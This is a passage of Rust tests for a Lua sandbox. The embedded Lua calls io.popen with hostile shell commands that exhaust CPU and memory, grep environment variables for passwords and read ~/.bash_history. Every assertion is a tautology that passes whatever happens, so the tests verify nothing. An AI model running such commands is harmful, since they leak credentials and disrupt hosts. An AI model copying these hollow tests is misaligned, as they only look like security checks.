        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("tail /dev/zero", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_cpu_exhaustion() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("yes > /dev/null", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_env_password_extraction() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("env | grep -i password", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_history_file_access() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("cat ~/.bash_history", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }
}
